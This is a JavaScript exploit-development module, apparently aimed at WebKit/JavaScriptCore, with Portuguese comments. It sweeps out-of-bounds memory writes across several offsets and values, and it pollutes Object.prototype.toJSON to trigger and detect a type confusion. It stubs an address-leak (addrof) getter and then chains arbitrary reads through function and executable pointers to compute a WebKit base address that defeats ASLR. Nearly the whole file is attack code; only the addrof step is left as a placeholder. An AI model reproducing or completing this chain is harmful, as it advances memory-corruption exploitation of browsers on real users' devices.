// js/script3/testArrayBufferVictimCrash.mjs (R43L - Base Original Melhorada - CORRIGIDO)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_ImprovedBaseCorrected";

const VICTIM_TA_SCRATCHPAD_SIZE_ELEMENTS = 8;
const PROBE_CALL_LIMIT_V82 = 10;

const OOB_OFFSETS_TO_TEST = [0x7C, 0x78, 0x80]; // Testar offsets em torno do conhecido por causar TC
const OOB_VALUES_TO_TEST = [0xABABABAB, 0xFFFFFFFF];

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let target_function_for_addrof;
let leaked_address_via_addrof = null;

function isValidPointer(ptr, context = "") { /* ... (sem alteração da última versão) ... */
    if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
    return true;
}
function safeToHex(value, length = 8) { /* ... (sem alteração da última versão) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    try { return toHex(value); } catch (e) { return String(value); }
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Base Melhorada (Corrigido) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init ImprovedBaseCorr...`;

    target_function_for_addrof = function someUniqueLeakFunctionR43L_ImprovedBaseCorr() { return `target_R43L_IBCorr_${Date.now()}`; };
    
    // CORRIGIDO: Declarar final_probe_call_count_for_report aqui
    let final_probe_call_count_for_report = 0; 
    // CORRIGIDO: Declarar FNAME_CURRENT_ITERATION com valor default
    let FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Init`;


    logS3(`--- Fase 0 (ImprovedBaseCorr): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { 
        return { 
            errorOccurred: "OOB Sanity Check Failed", tc_probe_details: null, 
            addrof_result: { success: false, msg: "Addrof (ImprovedBaseCorr): Not run." },
            webkit_leak_result: { success: false, msg: "WebKit Leak (ImprovedBaseCorr): Not run." },
            iteration_results_summary: [], total_probe_calls_last_iter: final_probe_call_count_for_report, 
            oob_params_of_best_result: null, heisenbug_on_M2_in_best_result: false, 
            best_iter_addrof_details: null 
        }; 
    }

    let iteration_results_summary = [];
    let best_result_overall = {
        errorOccurred: null, tc_probe_details: null, stringifyResultSonda: null,
        addrof_result: { success: false, msg: "Addrof (ImprovedBaseCorr): Não obtido.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (ImprovedBaseCorr): Não obtido.", webkit_base_candidate: null },
        oob_params_of_best_result: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        best_iter_addrof_details: null,
        // Adicionar total_probe_calls_last_iter e iteration_results_summary aqui para garantir que existam
        total_probe_calls_last_iter: 0,
        iteration_results_summary: []
    };
    
    let global_addrof_primitive_found = false;
    let global_webkit_leak_found = false;

    for (const current_oob_offset of OOB_OFFSETS_TO_TEST) {
        if (global_addrof_primitive_found && global_webkit_leak_found) break; 

        for (const current_oob_value of OOB_VALUES_TO_TEST) {
            if (global_addrof_primitive_found && global_webkit_leak_found) break;
            if (current_oob_value === null || current_oob_value === undefined) continue;

            leaked_address_via_addrof = null;
            let addrof_success_this_iteration = false;

            const current_oob_hex_val = safeToHex(current_oob_value);
            const current_offset_hex = safeToHex(current_oob_offset);
            // CORRIGIDO: Atualizar FNAME_CURRENT_ITERATION dentro do loop
            FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_Val${current_oob_hex_val}`;

            logS3(`\n===== ITERATION ImprovedBaseCorr: Offset OOB: ${current_offset_hex}, Valor OOB: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val}`;

            let victim_ta_scratchpad_for_getter = null;
            let m1_ref = null; 
            let m2_ref = null;

            let iter_addrof_details = {
                attempted: false, success: false, leaked_address_str: null, notes: "",
                raw_low: null, raw_high: null
            };

            let probe_call_count_iter = 0;
            let tc_detected_this_iter = false;
            let tc_details_this_iter = null;

            function improved_base_probe_toJSON_corrected() {
                probe_call_count_iter++; const call_num = probe_call_count_iter;
                const ctts = Object.prototype.toString.call(this);
                const is_m2c = (this === m2_ref && m2_ref !== null);

                try {
                    if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                    if (call_num === 1 && this === victim_ta_scratchpad_for_getter) {
                        m2_ref = { id: "M2_ImprovedBaseCorr" };
                        m1_ref = { id: "M1_ImprovedBaseCorr", m2_payload: m2_ref };
                        logS3(`[PROBE_IBCorr] Call #${call_num}: 'this' é victim_ta_scratchpad. M1/M2 criados.`, "debug_detail");
                        return m1_ref;
                    } else if (is_m2c) {
                        if (!tc_detected_this_iter) {
                            tc_detected_this_iter = true;
                            tc_details_this_iter = {
                                call_number_tc_detected: call_num, probe_variant: "ImprovedBaseProbeCorr",
                                this_type_actual: ctts, this_is_M2: true,
                                m2_id: this.id,
                                notes: "TC Confirmada. Definindo getter em M2..."
                            };
                            logS3(`[PROBE_IBCorr] Call #${call_num} (M2C): FIRST TC. 'this' é M2 (id: ${this.id}). Tipo: ${ctts}`, "vuln");
                            
                            try {
                                Object.defineProperty(this, 'leaky_property_for_addrof', {
                                    get: function() {
                                        logS3("   [GETTER_IBCorr] Getter 'leaky_property_for_addrof' em M2 ACIONADO!", "vuln_potential");
                                        iter_addrof_details.attempted = true;

                                        if (!victim_ta_scratchpad_for_getter || !victim_ta_scratchpad_for_getter.buffer || victim_ta_scratchpad_for_getter.buffer.byteLength < 8) {
                                            iter_addrof_details.notes = "Scratchpad inválido.";
                                            logS3("      [GETTER_IBCorr] ERRO: Scratchpad inválido.", "error");
                                            return "getter_err_invalid_scratchpad";
                                        }
                                        
                                        logS3("      [GETTER_IBCorr] PONTO DE EXTENSÃO: Implementar NOVA técnica de addrof aqui.", "info_emphasis");
                                        iter_addrof_details.notes = "Ponto de extensão para nova técnica de addrof.";
                                        iter_addrof_details.success = false; // Simular falha até termos nova técnica

                                        // Exemplo de como popular se uma nova técnica funcionar:
                                        // if (nova_tecnica_addrof_sucesso) {
                                        //    leaked_address_via_addrof = nova_tecnica_addrof_resultado;
                                        //    addrof_success_this_iteration = true;
                                        //    global_addrof_primitive_found = true;
                                        //    iter_addrof_details.success = true;
                                        //    iter_addrof_details.leaked_address_str = leaked_address_via_addrof.toString(true);
                                        //    iter_addrof_details.notes = "Nova técnica de Addrof BEM SUCEDIDA!";
                                        // }

                                        if (iter_addrof_details.success) return "getter_new_addrof_success";
                                        else return "getter_new_addrof_failed";
                                    },
                                    enumerable: true, configurable: true
                                });
                                logS3(`   Getter 'leaky_property_for_addrof' definido em 'this' (M2).`, "debug");
                            } catch (e_def_getter) {
                                logS3(`   ERRO ao definir getter em 'this' (M2): ${e_def_getter.message}`, "error");
                                if (tc_details_this_iter) tc_details_this_iter.error_probe = `DefineGetterErr: ${e_def_getter.message}`;
                            }
                        }
                        return this;
                    }
                } catch (e_pm) { 
                    if (!tc_details_this_iter) tc_details_this_iter = { error_probe: `ProbeMainErrEarly:${e_pm.message}`};
                    else tc_details_this_iter.error_probe = (tc_details_this_iter.error_probe || "") + ` ProbeMainErr:${e_pm.message}`;
                    console.error("[PROBE_IBCorr] Erro:", e_pm); return { err_pm: call_num, msg: e_pm.message };
                }
                return { gen_m: call_num, type: ctts };
            }

            let iter_primary_error = null;
            let iter_stringify_output_raw = null;
            try {
                victim_ta_scratchpad_for_getter = new Uint32Array(VICTIM_TA_SCRATCHPAD_SIZE_ELEMENTS);
                victim_ta_scratchpad_for_getter.fill(0);
                logS3(`   Victim Uint32Array (scratchpad) criado.`, 'info');

                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
                oob_write_absolute(current_oob_offset, current_oob_value, 4);
                logS3(`   OOB Write: ${current_oob_hex_val} @ ${current_offset_hex}`, 'info');
                await PAUSE_S3(150);

                const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: improved_base_probe_toJSON_corrected, writable: true, configurable: true, enumerable: false });
                    polluted = true;
                    iter_stringify_output_raw = JSON.stringify(victim_ta_scratchpad_for_getter);
                    if (best_result_overall.stringifyResultSonda === null) best_result_overall.stringifyResultSonda = iter_stringify_output_raw; // Salvar o primeiro
                    
                    logS3(`   JSON.stringify output: ${iter_stringify_output_raw ? iter_stringify_output_raw.substring(0,100) : "null" }...`, "debug_detail");
                    if (tc_detected_this_iter) logS3(`  TC Probe (ImprovedBaseCorr): TC CONFIRMADA.`, "vuln");
                    else logS3(`  TC Probe (ImprovedBaseCorr): TC NÃO Confirmada.`, "warn");
                } catch (e_str) { iter_primary_error = e_str; logS3(`  JSON.stringify EXCEPTION: ${e_str.message}`, "error"); }
                finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }
                
                addrof_success_this_iteration = iter_addrof_details.success; 
                if (addrof_success_this_iteration) global_addrof_primitive_found = true;

                if (addrof_success_this_iteration && leaked_address_via_addrof) {
                    // Tentar WebKitLeak
                    logS3(`  ADDROF OBTIDO (${leaked_address_via_addrof.toString(true)})! Tentando WebKitLeak...`);
                    if (arb_read) {
                        try {
                            // Assumindo que leaked_address_via_addrof é o endereço de target_function_for_addrof
                            const ptr_exe = await arb_read(leaked_address_via_addrof.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                            if (isValidPointer(ptr_exe, "_wkLeakExeIBCorr")) {
                                const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                                if (isValidPointer(ptr_jitvm, "_wkLeakJitVmIBCorr")) {
                                    const base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
                                    logS3(`  !!! POTENCIAL WEBKIT BASE: ${base_candidate.toString(true)} !!!`, "success_major");
                                    best_result_overall.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${base_candidate.toString(true)}`, webkit_base_candidate: base_candidate.toString(true) };
                                    global_webkit_leak_found = true;
                                } else { throw new Error("Ponteiro JIT/VM inválido."); }
                            } else { throw new Error("Ponteiro Executable inválido."); }
                        } catch(e_wk_leak) {
                            logS3(`  Erro no WebKitLeak: ${e_wk_leak.message}`, "error");
                            if (!best_result_overall.webkit_leak_result.success) { // Não sobrescrever sucesso anterior
                                best_result_overall.webkit_leak_result = { success: false, msg: `WebKitLeak falhou: ${e_wk_leak.message}` };
                            }
                        }
                    }
                }
            } catch (e_outer_iter) { iter_primary_error = e_outer_iter; }
            finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear` }); }

            // CORRIGIDO: Atribuir a final_probe_call_count_for_report aqui
            final_probe_call_count_for_report = probe_call_count_iter;
            let current_iter_summary = {
                oob_offset: current_offset_hex, oob_value: current_oob_hex_val,
                raw_oob_offset: current_oob_offset, raw_oob_value: current_oob_value,
                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: tc_details_this_iter,
                addrof_details_iter: iter_addrof_details,
                addrof_success_this_iter: addrof_success_this_iteration,
                webkit_leak_success_this_iter: best_result_overall.webkit_leak_result.success && addrof_success_this_iteration, // Só é sucesso *desta iteração* se o addrof dela levou ao WebKitLeak
                heisenbug_on_M2_confirmed_by_tc_probe: tc_detected_this_iter
            };
            iteration_results_summary.push(current_iter_summary);

            // Lógica para atualizar best_result_overall
            if (current_iter_summary.error === null) {
                let current_is_better = false;
                const cur_wk = current_iter_summary.webkit_leak_success_this_iter;
                const cur_addr = current_iter_summary.addrof_success_this_iter;
                const cur_tc = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;

                if (best_result_overall.oob_params_of_best_result === null) current_is_better = true;
                else { /* ... (lógica de melhor resultado como antes, priorizando WK > Addrof > TC) ... */
                    const best_wk = best_result_overall.webkit_leak_result.success;
                    const best_addr = best_result_overall.addrof_result.success;
                    const best_tc = best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe;
                    if (cur_wk && !best_wk) current_is_better = true;
                    else if (cur_wk === best_wk) {
                        if (cur_addr && !best_addr) current_is_better = true;
                        else if (cur_addr === best_addr) { if (cur_tc && !best_tc) current_is_better = true; }
                    }
                }
                if (current_is_better) {
                    best_result_overall.errorOccurred = null;
                    best_result_overall.tc_probe_details = current_iter_summary.tc_probe_details;
                    best_result_overall.addrof_result.success = current_iter_summary.addrof_success_this_iter;
                    if(current_iter_summary.addrof_success_this_iter && leaked_address_via_addrof) {
                        best_result_overall.addrof_result.leaked_object_addr = leaked_address_via_addrof.toString(true);
                        best_result_overall.addrof_result.msg = `Addrof obtido: ${leaked_address_via_addrof.toString(true)}`;
                    } else if (!current_iter_summary.addrof_success_this_iter) { // Resetar se esta iteração não teve addrof
                        best_result_overall.addrof_result.msg = "Addrof (ImprovedBaseCorr): Não obtido no melhor resultado.";
                        best_result_overall.addrof_result.leaked_object_addr = null;
                    }
                    // WebKit leak já é atualizado em best_result_overall.webkit_leak_result se for bem-sucedido
                    best_result_overall.oob_params_of_best_result = { offset: current_offset_hex, value: current_oob_hex_val, raw_offset: current_oob_offset, raw_value: current_oob_value };
                    best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;
                    best_result_overall.best_iter_addrof_details = current_iter_summary.addrof_details_iter;
                    logS3(`*** NOVO MELHOR RESULTADO: Off ${current_offset_hex} Val ${current_oob_hex_val} (Addrof:${cur_addr}, WKLeak:${cur_wk}, TC:${cur_tc}) ***`, "success_major");
                }
            }
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val} TC:${tc_detected_this_iter} Addr:${addrof_success_this_iteration}`;
            await PAUSE_S3(50);
        }
        if (global_addrof_primitive_found && global_webkit_leak_found) break;
        await PAUSE_S3(100);
    }

    // Atribuir ao objeto de resultado final
    best_result_overall.total_probe_calls_last_iter = final_probe_call_count_for_report;
    best_result_overall.iteration_results_summary = iteration_results_summary;
    best_result_overall.oob_value_of_best_result = best_result_overall.oob_params_of_best_result ? `${best_result_overall.oob_params_of_best_result.offset}_${best_result_overall.oob_params_of_best_result.value}` : "N/A";
    // o campo heisenbug_on_M2_in_best_result já é o heisenbug_on_M2_confirmed_by_tc_probe do best_result_overall

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final best_result_overall (ImprovedBaseCorr): ${JSON.stringify(best_result_overall, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    let final_title = `${FNAME_CURRENT_TEST_BASE} Final: `;
    if(best_result_overall.webkit_leak_result.success) final_title += "WEBKITLEAK_OK! ";
    else if(best_result_overall.addrof_result.success) final_title += "ADDROF_OK! ";
    else if(best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe) final_title += "TC_OK ";
    if(final_title === `${FNAME_CURRENT_TEST_BASE} Final: `) final_title += "NoMajorSuccess";
    best_result_overall.final_title_page = final_title.trim(); // Salvar para o runner
    document.title = best_result_overall.final_title_page;

    return best_result_overall;
}
